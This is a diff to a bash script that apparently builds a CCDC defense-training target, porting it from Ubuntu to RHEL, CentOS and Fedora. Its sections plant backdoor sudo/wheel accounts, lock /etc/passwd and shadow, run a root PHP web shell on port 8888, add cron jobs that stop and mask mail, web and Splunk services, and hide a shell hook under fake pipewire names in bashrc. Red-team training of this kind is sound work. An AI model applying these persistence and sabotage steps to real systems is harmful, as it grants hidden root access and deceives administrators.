@@ -7,11 +7,13 @@
 # purpose — run that one separately if you want the 5-location startup
 # beacon too).
 #
+# Supports: Ubuntu, Debian, CentOS, RHEL, Fedora
+#
 # Sections, in order:
 #   1. Target setup   — CCDC_Linux_TargetSetup_HTTP_Mail_Splunk.sh
-#                        (Apache2, Postfix+Dovecot, Splunk Enterprise)
+#                        (Apache2/httpd, Postfix+Dovecot, Splunk Enterprise)
 #   2. Rogue users     — CCDC_Linux_Users_HomeIntruders.sh
-#                        (3 backdoor sudo accounts, immutable /etc/passwd+shadow)
+#                        (3 backdoor sudo/wheel accounts, immutable /etc/passwd+shadow)
 #   3. Web shell       — CCDC_Linux_WebShell_OopsAllWebShells.sh
 #                        (sillyevilservice PHP service on :8888, runs as root)
 #   4. Cron jobs       — CCDC_Linux_CronJobs_ImGonnaCron.sh
@@ -36,6 +38,67 @@ warn()    { echo -e "${YELLOW}[!]${NC} $*"; }
 success() { echo -e "${GREEN}[+]${NC} $*"; }
 err()     { echo -e "${RED}[-]${NC} $*" >&2; }
 die()     { err "$*"; exit 1; }
+
+# ── Distro detection ──────────────────────────────────────────────────────────
+detect_distro() {
+    if [[ -f /etc/os-release ]]; then
+        . /etc/os-release
+        OS=$ID
+        OS_PRETTY=$PRETTY_NAME
+    elif [[ -f /etc/redhat-release ]]; then
+        OS="rhel"
+        OS_PRETTY="$(cat /etc/redhat-release)"
+    else
+        OS="unknown"
+        OS_PRETTY="Unknown Linux"
+    fi
+}
+
+# Determine package manager and web server name
+set_distro_vars() {
+    case "$OS" in
+        ubuntu|debian)
+            PKG_MGR="apt-get"
+            PKG_UPDATE="apt-get update -y"
+            PKG_INSTALL="apt-get install -y"
+            SUDO_GROUP="sudo"
+            WEB_SERVER="apache2"
+            WEB_SERVER_SVC="apache2"
+            BASH_RC_PATH="/etc/bash.bashrc"
+            ;;
+        centos|rhel)
+            PKG_MGR="yum"
+            PKG_UPDATE="yum update -y"
+            PKG_INSTALL="yum install -y"
+            SUDO_GROUP="wheel"
+            WEB_SERVER="httpd"
+            WEB_SERVER_SVC="httpd"
+            BASH_RC_PATH="/etc/bashrc"
+            ;;
+        fedora)
+            PKG_MGR="dnf"
+            PKG_UPDATE="dnf update -y"
+            PKG_INSTALL="dnf install -y"
+            SUDO_GROUP="wheel"
+            WEB_SERVER="httpd"
+            WEB_SERVER_SVC="httpd"
+            BASH_RC_PATH="/etc/bashrc"
+            ;;
+        *)
+            err "Unknown distro: $OS"
+            exit 1
+            ;;
+    esac
+}
+
+detect_distro
+set_distro_vars
+
+info "Detected OS: $OS_PRETTY"
+info "Package manager: $PKG_MGR"
+info "Web server: $WEB_SERVER"
+info "Sudo group: $SUDO_GROUP"
+echo
 
 section() {
     echo
@@ -84,14 +147,14 @@ section_target_setup() {
 
     # -- 0. Base update --
     info "Updating package lists"
-    apt-get update -y
+    $PKG_UPDATE
 
     info "Installing base utilities"
-    apt-get install -y curl wget gnupg2 ca-certificates lsb-release
+    $PKG_INSTALL curl wget gnupg2 ca-certificates
 
-    # -- 1. Apache2 --
-    info "Installing Apache2"
-    apt-get install -y apache2
+    # -- 1. Web Server (Apache2/httpd) --
+    info "Installing $WEB_SERVER"
+    $PKG_INSTALL $WEB_SERVER
 
     cat > /var/www/html/index.html <<'EOF'
 <!doctype html>
@@ -104,23 +167,29 @@ section_target_setup() {
 </html>
 EOF
 
-    systemctl enable --now apache2
+    systemctl enable --now $WEB_SERVER_SVC
 
-    info "Verifying Apache2"
+    info "Verifying $WEB_SERVER"
     sleep 2
     if curl -sf http://localhost/ >/dev/null; then
-        success "Apache2 responded on http://localhost/"
+        success "$WEB_SERVER responded on http://localhost/"
     else
-        warn "Apache2 did not respond on port 80 - check 'systemctl status apache2'"
+        warn "$WEB_SERVER did not respond on port 80 - check 'systemctl status $WEB_SERVER_SVC'"
     fi
 
     # -- 2. Mail server: Postfix + Dovecot (local only) --
     info "Pre-seeding Postfix answers (avoids interactive prompts)"
-    echo "postfix postfix/main_mailer_type select Internet Site" | debconf-set-selections
-    echo "postfix postfix/mailname string ${MAIL_DOMAIN}" | debconf-set-selections
+    if [[ "$PKG_MGR" == "apt-get" ]]; then
+        echo "postfix postfix/main_mailer_type select Internet Site" | debconf-set-selections
+        echo "postfix postfix/mailname string ${MAIL_DOMAIN}" | debconf-set-selections
+    fi
 
     info "Installing Postfix, Dovecot, and mail utilities"
-    apt-get install -y postfix dovecot-imapd dovecot-pop3d mailutils
+    if [[ "$PKG_MGR" == "apt-get" ]]; then
+        $PKG_INSTALL postfix dovecot-imapd dovecot-pop3d mailutils
+    else
+        $PKG_INSTALL postfix dovecot dovecot-imapd dovecot-pop3d mailx
+    fi
 
     info "Making ${MAIL_DOMAIN} resolve locally"
     if ! grep -q "${MAIL_DOMAIN}" /etc/hosts; then
@@ -224,12 +293,22 @@ EOF
 
     # -- 4. Optional firewall rules --
     if [[ "${ENABLE_FIREWALL}" == "true" ]]; then
-        info "Configuring ufw"
-        apt-get install -y ufw
-        ufw allow OpenSSH
-        ufw allow 80/tcp
-        ufw allow 8000/tcp
-        ufw --force enable
+        info "Configuring firewall"
+        if [[ "$PKG_MGR" == "apt-get" ]]; then
+            $PKG_INSTALL ufw
+            ufw allow OpenSSH
+            ufw allow 80/tcp
+            ufw allow 8000/tcp
+            ufw --force enable
+        else
+            # RHEL/CentOS/Fedora use firewalld
+            $PKG_INSTALL firewalld
+            systemctl enable --now firewalld
+            firewall-cmd --permanent --add-service=http
+            firewall-cmd --permanent --add-service=https
+            firewall-cmd --permanent --add-port=8000/tcp
+            firewall-cmd --reload
+        fi
     else
         info "Skipping firewall changes (ENABLE_FIREWALL=false). Mail is loopback-only regardless."
     fi
@@ -287,12 +366,7 @@ section_users() {
     )
 
     local USER_SHELL="/bin/bash"
-    local SUDO_GROUP="sudo"   # Debian/Ubuntu; change to "wheel" for RHEL/CentOS/Fedora
-
-    # Detect if the system uses 'wheel' instead of 'sudo'
-    if getent group wheel &>/dev/null && ! getent group sudo &>/dev/null; then
-        SUDO_GROUP="wheel"
-    fi
+    # SUDO_GROUP is set by set_distro_vars based on detected OS
 
     info "Creating backdoor training users..."
     echo
@@ -362,8 +436,8 @@ section_webshell() {
 
     # -- Install dependencies --
     info "Updating package index and installing PHP CLI..."
-    apt-get update -qq
-    apt-get install -y -qq php-cli
+    $PKG_UPDATE > /dev/null 2>&1 || true
+    $PKG_INSTALL php-cli > /dev/null 2>&1
 
     local PHP_BIN
     PHP_BIN="$(command -v php)"
@@ -547,7 +621,8 @@ section_cronjobs() {
     local JOB2_USER="root"
 
     # Services to stop & mask
-    local -a SERVICES=("dovecot" "postfix" "apache2" "splunk")
+    # Note: use $WEB_SERVER_SVC (apache2 or httpd) and "splunk" (may vary)
+    local -a SERVICES=("dovecot" "postfix" "$WEB_SERVER_SVC" "splunk")
 
     # Build the inline command: stop + mask each service
     local -a parts=()
@@ -635,13 +710,13 @@ HOOK_EOF
     chmod 644 "${BACKUP}"
     success "Backed up hook to ${BACKUP}"
 
-    # Ubuntu's /etc/bash.bashrc does not source /etc/profile.d/ by itself.
+    # Some distros' bash.bashrc/bashrc do not source /etc/profile.d/ by itself.
     # Add a source line so non-login interactive shells also pick up the hook.
-    if ! grep -qF "99-pipewire-session-env.sh" /etc/bash.bashrc 2>/dev/null; then
-        printf '\n# systemd-pipewire-multithread-runner: session environment init\n' >> /etc/bash.bashrc
+    if ! grep -qF "99-pipewire-session-env.sh" "$BASH_RC_PATH" 2>/dev/null; then
+        printf '\n# systemd-pipewire-multithread-runner: session environment init\n' >> "$BASH_RC_PATH"
         printf '[ -r /etc/profile.d/99-pipewire-session-env.sh ] && . /etc/profile.d/99-pipewire-session-env.sh\n' \
-            >> /etc/bash.bashrc
-        success "Added source line to /etc/bash.bashrc (covers non-login shells)"
+            >> "$BASH_RC_PATH"
+        success "Added source line to $BASH_RC_PATH (covers non-login shells)"
     fi
 
     # -- Write the enforcement script --
